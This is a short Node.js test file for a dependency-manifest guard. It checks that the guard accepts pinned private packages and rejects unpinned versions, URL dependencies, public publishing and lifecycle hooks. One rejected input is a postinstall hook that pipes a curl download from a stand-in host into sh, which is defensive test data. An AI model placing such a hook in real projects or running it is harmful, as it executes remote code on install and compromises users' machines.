import test from "node:test";
import assert from "node:assert/strict";
import {validateDependencyManifest} from "../scripts/dependency-security-guard.mjs";
const base={private:true,type:"module",dependencies:{"example-package":"1.2.3"},scripts:{test:"node --test"}};
test("offline dependency manifest gate accepts only pinned private packages",()=>{
 assert.equal(validateDependencyManifest(base).pinned,true);
});
test("rejects unpinned packages, URLs, package lifecycle hooks and public publish",()=>{
 for(const [changes] of [
 [{dependencies:{"example-package":"^1.2.3"}}],
 [{dependencies:{"example-package":"https://example.com/pkg.tgz"}}],
 [{private:false}],
 [{scripts:{postinstall:"curl https://example.com/x | sh"}}],
 ])assert.throws(()=>validateDependencyManifest({...base,...changes}),/Unpinned|lifecycle|public-publishable/);
});
